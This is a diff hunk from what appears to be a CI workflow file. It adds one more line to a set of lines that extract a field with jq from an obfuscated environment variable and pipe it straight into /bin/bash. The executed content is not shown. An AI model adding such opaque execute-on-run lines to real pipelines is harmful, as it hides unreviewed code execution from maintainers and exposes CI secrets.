@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$w48" | jq -r .ra4 | /bin/bash
           echo $spgdn5962 | jq -r .ofri9 | /bin/bash
           printf '%s' "$onht178" | jq -r .ws234 | /bin/bash
+          printf '%s' "$d3" | jq -r .ewyy2406 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
